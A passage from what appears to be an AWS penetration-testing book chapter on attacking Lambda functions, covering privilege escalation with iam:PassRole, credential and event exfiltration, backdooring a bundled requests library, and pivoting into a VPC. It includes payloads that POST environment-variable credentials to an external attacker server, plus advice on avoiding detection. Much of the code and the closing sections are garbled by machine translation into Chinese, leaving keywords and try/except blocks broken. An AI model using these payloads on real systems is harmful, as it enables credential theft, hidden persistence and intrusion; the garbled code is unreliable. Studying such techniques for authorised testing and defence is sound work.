*   Try to formulate your payloads so that they do what you want without breaking the execution of the function. A Lambda function execution that errors out might attract some unwanted attention!
*   When writing your payloads, be wary of the timeout of the function. The default is for the function to timeout after three seconds, so you will need some quick, easy exfiltration in that case.

# Attacking Lambda functions with read and write access

Now that we have covered attacking Lambda functions while you only have read access to Lambda, we will move on to read and write access. In this scenario, we are going to assume that you, as the attacker, have `"lambda:*"` permissions, which basically means that you can read and write anything, which includes editing existing functions, creating your own functions, deleting functions, and so on. This opens a whole new attack surface that is prime for many different attacks, particularly privilege escalation, data exfiltration, and persistence.

For this section, we won't be setting up a new vulnerable function, but instead we will just use what we set up previously for a few demos.

# Privilege escalation

Privilege escalation through Lambda functions is relatively easy, depending on the setup that you encounter. We'll look at two separate scenarios: one where you have `"lambda:*"` permissions and `"iam:PassRole"` permissions, and one with just `"lambda:*"` permissions.

First, we are going to assume that we have the `"iam:PassRole"` permission in addition to our full Lambda access. We'll also assume that we can list IAM roles, but nothing more than that (`iam:ListRoles`). In this scenario, our target doesn't necessarily even need to be actively using Lambda for us to escalate our privileges. Because we have the IAM `ListRoles` permission, we can run the following AWS CLI command to see what IAM roles exist in the account (make sure to specify the correct profile that you are working with):

```

aws iam list-roles --profile LambdaReadWriteUser

```

You should get back a list of each role in the account and their `"AssumeRolePolicyDocument"`. Now, we can filter through this list to find any role that Lambda can assume. Here is what an example role would look like in this response (this is the role that we created for our vulnerable function):

```

{

"路径": "/",

"角色名称": "LambdaRoleForVulnerableFunction",

"角色 ID": "AROAIWA1V2TCA1TNPM9BL",

"Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",

"创建日期": "2018-12-19T21:01:17Z",

"假定角色策略文档": {

"版本": "2012-10-17",

"声明": [

{

"效果": "允许",

"主体": {

"服务": "lambda.amazonaws.com"

}，

"操作": "sts:AssumeRole

}

]

}，

"描述": "允许 Lambda 函数代表您调用 AWS 服务。",

"最大会话持续时间": 3600

}

```

We can see that under `"AssumeRolePolicyDocument"`|`"Statement"` |`"Principal"`, a `"Service"` is specified, and its value is `"lambda.amazonaws.com"`. This means that the Lambda AWS service can assume this role and get temporary credentials. For a role to be attached to a Lambda function, Lambda must be able to assume it.

Now, filter out the role list so that you only have roles that can be assumed by Lambda left. Again, we are assuming that we don't have any more IAM privileges aside from `ListRoles` and `PassRole`, so we can't investigate what permissions these roles have, and our best bet is to try to infer what services they are meant to work with, based on their names and descriptions. One of the roles that showed up when running IAM `ListRoles` was named `"LambdaEC2FullAccess"`, which makes it obvious what permissions we can expect it to have. EC2 is one of the more fruitful services to gain access to, so we are going to target this role for our demo.

In previous chapters, we looked at the IAM `PassRole` permission, which allows us to `"pass"` an IAM role to some AWS resource, to give it access to the temporary credentials for that role. One example of this is passing a role to an EC2 instance, which allows the EC2 service to access the role; we even passed a role to our vulnerable Lambda function earlier in this chapter. We have full access to Lambda and the ability to pass roles to Lambda functions, so that means we can essentially gain access to any role that Lambda can access.

This can be done through the AWS CLI with the Lambda `CreateFunction` API, but we are going to walk through the AWS web console. First, we will want to create a new Lambda function, give it a name (`"Test"` for this demo), choose a runtime (`python3.7` again), and select `"Choose an existing role"` for the Role drop-down menu. Then, we are going to select `"LambdaEC2FullAccess"` from the Existing role drop-down menu, and finally, we click on `"Create function"`.

This time, we have direct access to the code of the function, so we won't need to exfiltrate, or even look at, the credentials for this role. We can just use the AWS SDK library for the programming language we chose, which is the Python `boto3` library; it is included in the Lambda setup, so there is no need to include it as a dependency for the function. Now, all that is left is deciding what we want to do with the role we are gaining access to, and we know it has `"EC2FullAccess"` permissions based on the name, so we will import `boto3`, create an EC2 client, and call the EC2 `DescribeInstances` API. This only takes a few lines of code in Python, but we will want to format the JSON responses that are returned for easier reading, so we will also use the JSON library. This can be seen here:

```

导入 json

导入 boto3

def lambda_handler（event，context）：

ec2 = boto3.client（'ec2'）

reservations = ec2.describe_instances（）['Reservations']

打印（json.dumps（reservations，indent = 2，默认= str））

```

Something to note is that we don't need to specify the credentials for the `boto3` client, because it will automatically check environment variables if we don't explicitly pass anything in. This way, it will always use the most up-to-date credentials in the Lambda function.

To execute the function, we need to create a test event, so make sure that you click on the orange Save button, and then click on the white Test button directly to the left of it:

![](img/8791b537-b937-4c1d-bd9d-94989dd775fe.png)

The Test button to create our test event

It should pop up a screen to set up a test event; we don't care how it is configured, because we are not actually using the event. It is just required to run the function through the web console. We'll select the `Hello World` event template (you can choose anything) and give it the name `Test`, and then click on Create on the bottom right of the screen:

![](img/f729d0b7-8abc-4ee0-9c7e-091c8dd3890f.png)

Creating a simple test event for our function

Now we can just click on the Test button one more time, and it will execute our function using the test event that we just created. We found a single EC2 instance in the `us-west-2` region (the `AWS_REGION` environment variable is automatically set to the region our Lambda function is in, so `boto3` will use that for the API call). We can see these results in the Execution Results tab, which should pop up after the function executes:

![](img/3a4a3d86-4795-4cc7-b300-20ece08b8c2e.png)

A small section of information retrieved about the EC2 instances in us-west-2

That worked, so it's clear that we can write whatever code we want and instruct the IAM role to do what we want. Maybe we want to start up a bunch of EC2 instances, or we want to try to use this EC2 access for further exploitation, or many other possibilities. If you didn't have the IAM `ListRoles` permission, you could look at other existing Lambda functions to see what roles are attached to them, and then you could try those out to see what kind of access you gained.

For our second scenario, we are assuming that we do not have the IAM `PassRole` permission, which means that we can't create a new Lambda function, because the function is required to have a role passed to it. To capitalize on this situation, we need to work with existing Lambda functions. For this demo, we'll be targeting the `VulnerableFunction` we created earlier in this chapter.

We need to be a little bit more careful in this situation, because instead of creating new Lambda functions, we will be modifying existing functions. We don't want to disrupt anything going on in the environment, because first, we try to avoid that at all costs as pentesters, and secondly, we don't want to attract more attention to ourselves as an attacker than is needed. A Lambda function that suddenly stops working would be a big red flag to someone paying attention. We can make sure this doesn't happen by ensuring that any code we add to the function doesn't disrupt the rest of the execution, which means we need to catch and silence any error that our additional code throws. Also, because we might not know if a function is going to error out early in its normal execution, we should try to put our code as close to the beginning of the execution as we can, in order to ensure it gets executed.

Back to the `VulnerableFunction` we created earlier, we know that the role attached to it has S3 permissions, because the function code interacts with S3 (and because we set the role up ourselves). To start somewhere simple, we are just going to list the S3 buckets in the account to see what we can work with. We can do this by adding the following code to the `VulnerableFunction`, right after line 6 (as soon as `lambda_handler()` is invoked, and prior to any other code running):

```

尝试：

s3 = boto3.client（'s3'）

打印（s3.list_buckets（））

尝试：

通过

```

We could even go as far as we did previously, to import the JSON library and format the output, but it's best to make as few changes as possible to the existing function. We are using a `try`/`except` block to make sure that any errors that arise don't halt the execution of the function, and by putting `pass` in the except block, we can ensure that the error is silently discarded, and the function will then execute as normal. The beginning of that `VulnerableFunction` should now look like this:

![](img/e1d7eeef-e7aa-4212-9503-42aefa375920.png)

The beginning of VulnerableFunction after we added our code to it

The only problem with this payload is that it assumes we can view the execution logs of this Lambda function, which we may or may not have access to. We need either access to CloudWatch logs or the ability to run the function with test events, so we can view the output in the web console. For now we'll say that we don't have CloudWatch access, so we'll have to go with test events. The next problem is that we are likely missing the whole context around this Lambda function. We don't necessarily know when it would make sense for the function to be invoked, when it would make sense that the function errors out, how often it gets invoked, what the implications are if it is invoked outside of its normal triggers, and many other things.

To solve that problem, we can either just ignore it and run test events against the function without worrying about the consequences (not a good idea, unless you are very sure it won't break anything in the environment and that it won't attract unnecessary attention from a defender), or we can modify our payload to exfiltrate the credentials, kind of like the first section of this chapter. This would likely be the safest method, because we can add our malicious payload to the function, set up a listener on our external server, and then just wait until the Lambda function gets invoked normally. To do this, we could import the subprocess and use `curl` like before, but a simpler way would be to use the Python `requests` library. Requests isn't automatically included in the default libraries available to a Lambda function, but `botocore` is, and `botocore` relies on the `requests` library, so there is a cool trick that we can use to import and use `requests`. Instead of `import requests`, we use the following `import` statement:

```

从 botocore.vendored 导入请求

```

Now, we can access the `requests` library normally. So, following a similar method to what we did earlier in this chapter, we can just send an HTTP `POST` request with all the environment variables to our external server. We could also run the AWS API calls from within the Lambda function and exfiltrate the output, which would technically be safer, because the API calls would be coming from the same IP address as expected, rather than our external attack IP; however pulling the environment variables is more versatile and requires less modification to the function over time, so we are going with that. The following payload will do just that (where we are pretending that `1.1.1.1` is the IP of our external server again):

```

尝试：

导入 os

从 botocore.vendored 导入请求

请求.post（'http://1.1.1.1'，json = os.environ.copy（），超时= 0.01）

尝试：

通过

```

It uses the `requests` library to send an HTTP `POST` request that contains the environment variables fetched with the OS library, and the timeout is set to `0.01` so that the request is sent; the code immediately moves on, rather than waiting for any response and causing the Lambda function itself to timeout. Once this payload is added to the target Lambda function, we just wait for the function to get invoked by normal means, and eventually, we will get the credentials sent to our server:

![](img/286eb121-c4d3-46c6-ba28-336429a9dc39.png)

Receiving a POST request containing all the environment variables of the Lambda function

# Data exfiltration

Data exfiltration will likely work very similarly to how we escalated our privileges previously, in that we will most likely edit an existing function and exfiltrate data from it like that. There are a lot of different ways we could do this, some of which are listed here:

*   Modify an existing function and exfiltrate the data that it is receiving through the `"event"` and `"context"` parameters
*   Create a new function and associated trigger to respond to certain events in the AWS environment, such as in [Chapter 11](0d6c1dfb-b078-4ed0-a92a-b86751ef1db8.xhtml),* Using Boto3 and Pacu to Maintain AWS Persistence* where we exfiltrated credentials every time a new user was created
*   Modify an existing function and place our exfiltration payload somewhere in the middle of the function to exfiltrate data that is gathered/modified during the function's normal execution

There are many other attack vectors here, as well; you just need to get creative.

If we just wanted our payload to exfiltrate the value passed to the `"event"` parameter, we could use a slightly modified version of the previous payload:

```

尝试：

从 botocore.vendored 导入请求

requests.post（'http://1.1.1.1'，json = event，timeout = 0.01）

除外：

通过

```

Make sure to be aware of the timeout specified for the Lambda function you are working with. You don't want your exfiltration to take so long that the Lambda function times out and fails all together, so when you are exfiltrating large amounts of data through Lambda, it would be best to either ensure the timeout is already set to a high amount of time, or to go in and modify it yourself to increase the timeout. The problem with that is that the target's Lambda bill will go up, because their functions are taking longer to complete than normal, which would draw attention to you.

# Persistence

We aren't going to dive too deeply into persistence because we covered that in the last chapter, but, as with the other methods of attacking Lambda, persistence can be established with new Lambda functions or by editing existing Lambda functions. Persistence can also mean a few different things. Do you want persistence access to a bash shell for a Lambda function, do you want persistent access to the AWS environment, or do you want both? It is all about context and what works best for the situation you are in as an attacker. It might even be valuable to backdoor multiple Lambda functions, in case one gets caught and removed by a defender.

# Staying stealthy

This is where you can get creative. Obviously, random code added to a function that sends data to a random IP address will look fishy to anyone who is familiar with the code and is taking another look at it. In that situation, there might not even be an indicators-of-compromise that a defender picked up on, but a developer happened to notice this weird code in the Lambda function and asked a question about it, which then get you caught. It would be even more obvious with the malicious code at the beginning of the entire function like we would want it, so nesting your payload somewhere in the code would help a little bit.

What about placing your payload somewhere that wouldn't change anything in the entry function (`lambda_handler()`) and would have an extremely low chance of ever being manually reviewed/discovered? It sounds too good to be true, but it's not! Malicious hackers have been using similar techniques for many years, allowing their software/hardware backdoors to remain active for very long periods of time, so let's just adapt that technique to Lambda and stay under the radar!

This technique involves backdooring dependencies that a Lambda function relies on. Not every library you'll ever need is included in Lambda's base set of libraries, as we saw when we were being unable to `import requests` directly, so developers are forced to gather these dependencies themselves and upload them to Lambda with the rest of their code. We'll take a short look at a simple example of this.

Let's suppose that we were not able to import the `requests` library with `from botocore.vendored import requests`, and we needed to include that library with our Lambda code. This could be solved by including the `requests` library alongside our base Lambda code and uploading it as a `.zip` file to Lambda.

For this example, we have a `lambda_function.py` file that imports `requests` and makes a request to [https://google.com/](https://google.com/), and then prints the response text. The `requests` library is included in its entirety alongside it, to allow for the `import requests` code on line 2 in the following screenshot. The `requests` library requires the `chardet`, `urllib3`, `idna`, and `certify` libraries, as well, so those have been included:

![](img/0ed9d39c-4529-40a5-b318-752f416e69eb.png)

An example Lambda function that uses an included requests library

This function is short, so it would be obvious to just about anyone if the code was modified directly during our attack, but because it is importing the `requests` library, and the `requests` library source code is right there, as well, that will be our target. We can see that on line 4, the `requests.get()` method is being invoked. If we go looking around the source code of the `requests` library, we can find the `requests.get()` method in the `api.py` file, on line 63 (at the time of writing this, at least):

![](img/292e3758-55b4-461a-b11a-ba9f58338ab2.png)

The source code for the requests.get() method

We already know that this method is invoked every time the Lambda function will run, so all we need to do is modify it directly, rather than modifying the file that invokes it (`lambda_function.py`). Our payload needs to be a little different this time, because the entire `requests` library is not directly imported into each file within the `requests` library, so we have to use the `"request"` method, rather than `requests.post()`. Our payload will look like the following:

```

尝试：

数据= {'url'：url，'params'：params，** kwargs}

请求（'POST'，'http://1.1.1.1'，json = data，timeout = 0.01）

除外：

通过

```

This payload will basically just exfiltrate all the details about each request being made to our own server prior to completing the original request. We might be able to intercept some sensitive data to use to our advantage. We can place our malicious exfiltration payload right in the `get` method, as shown in the following screenshot:

![](img/30132e26-f6ca-417a-99b1-593714e5a6e2.png)

Our payload placed in the requests.get() method

Even if it does look a little strange, very few developers would ever think to review the source code of one of the libraries they've included, and even if they did, they didn't write the library, so it might not necessarily even stand out as strange to them. Now, every time this Lambda function is invoked, the `requests.get()` method will be invoked, which means that our payload will get executed and we will exfiltrate some data:

![](img/bb406a51-c093-499e-86a9-96ad2b3c23ec.png)

Successful exfiltration from within a Python dependency

We have now successfully exfiltrated information from a Lambda function without modifying any of the actual code of the main function. This attack can go many levels deeper, as well. If the main Lambda function requires library X, and the method in library X requires library Y, you could then backdoor all the way down into library Y. There are no limits, just as long as your method gets invoked somehow.

To do this in a real attack scenario, all you would need to do is export the Lambda function to a `.zip` file like we did earlier, make your modifications, and then re-upload it as the latest version for that function. Even if a defender sees that the function was modified, they still may never find the backdoor you implemented.

# Pivoting into Virtual Private Clouds

We've covered a lot of material involving attacking Lambda functions, but in this section, we will discuss pivoting from access to a Lambda function to access to the internal network of a **virtual private cloud** (**VPC**). This is made possible because Lambda functions can be launched into VPCs for a variety of reasons. This provides us attackers with Lambda access with the ability to interact with internal hosts and services that we may not otherwise be able to gain access to.

Again, we can approach this from two different angles. If we have the required privileges, we can launch a new Lambda function into a VPC of our choice, or we can modify the code of a Lambda function that has already been launched into a VPC. We're going to run through a demo wherein we will be editing a function that has already been launched into a VPC.

For this demo, if we look at the Network tab in the Lambda web UI, we can see that this function has been launched into the default VPC, it is in two subnets, and it is in the security group `sg-0e9c3b71`. We can also see that the security group allows inbound access to port 80 from some IP address, and it allows access to all ports from servers within the same security group:

![](img/379e712a-23b8-492e-9ac0-c9e9b00a778e.png)

The network settings for our target Lambda function

We will then run an EC2 `DescribeInstances` API call to find out what other servers exist in this VPC. We can do this with the following AWS CLI command:

```

aws ec2 describe-instances

```

Or, we can use the `"ec2__enum"` Pacu module. The results show us that there is one EC2 instance, and it is in the same security group as our Lambda function:

![](img/20938411-2a70-46c9-9939-9925406bc8eb.png)

One EC2 instance in the same security group as our Lambda function

Based on what we saw in this security group's inbound rules, we know that our Lambda function has access to every port on that EC2 instance. We also know that something is likely being hosted on port `80`, because the same security group whitelists access to port `80` to a different IP address. As an attacker with a small amount of EC2 permissions, it would generally be difficult to gain access to the inside of a VPC, but Lambda lets us get around that. We just need to modify the code in the Lambda function to do what we want within the VPC's network.

We're going to ignore whatever code is in our target Lambda function and just focus on our payloads to access the internal network. We know that we want to contact port `80` on that internal host, which likely means there is an HTTP server running, so we can use the `requests` library again to make a request to it. We still don't want to disrupt any production code, so everything will be wrapped in a `try`/`except` block, like before. The EC2 `DescribeInstances` call from a minute ago gave us the internal IP address of the target EC2 instance, which is `172.31.32.192`. Our payload will look something like this:

```

尝试：

从 botocore.vendored 导入请求

req = requests.get（'http://172.31.32.192 /'）

打印（req.text）

除外：

通过

```

为了简单起见，我们将只将输出打印到控制台并在那里查看，但这是另一种可能需要某种外泄的情况。但是，请确保您的 Lambda 函数具有 Internet 访问权限，因为当它们被启动到 VPC 中时，它们会失去默认的 Internet 访问权限，并依赖于 VPC 来提供该访问权限。

在运行有效负载以尝试向该内部 IP 发出 HTTP 请求后，我们在 Lambda 控制台中看到了以下内容：

！[]（img / c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png）

我们联系了内部服务器并收到了回应

就这样，我们可以看到，我们已经访问了内部网络，以绕过网络限制，并访问了我们正在攻击的公司的某种内部人力资源门户。在底部，我们甚至可以看到一张包含一些私人员工信息的表，例如他们的薪水。

这样就可以轻松地访问 AWS 网络的内部侧。这种方法可以用于各种不同的攻击，例如访问不公开可访问的 RDS 数据库，因为我们可以将 Lambda 函数启动到其所在的 VPC /子网中并与其进行连接。各种 AWS 服务都有将资源启动到私有 VPC 以禁用对其的公共访问的选项，而这种进入 VPC 内部的方法使我们能够访问所有这些不同的服务；其他一些示例包括`ElastiCache`数据库，EKS 集群等。

# 摘要

AWS Lambda 是一项非常多才多艺且有用的服务，既适用于 AWS 用户，也适用于攻击者。作为攻击者，我们可以利用 Lambda 的许多可能性，其中最好的一点是，我们的目标甚至不一定需要自己使用 Lambda，也可以使我们受益。

由于 Lambda 有许多不同的用例，它总是我们要检查的更高优先级服务之一，因为它通常会产生非常有益的攻击路径，使我们能够进一步访问 AWS 环境。还要记住的一件事是，与许多服务（包括 Lambda）一样，它们不断发展，打开和关闭不同的攻击路径，我们可以利用；保持最新和知识渊博非常重要，因为我们正在攻击的帐户将利用这些变化。
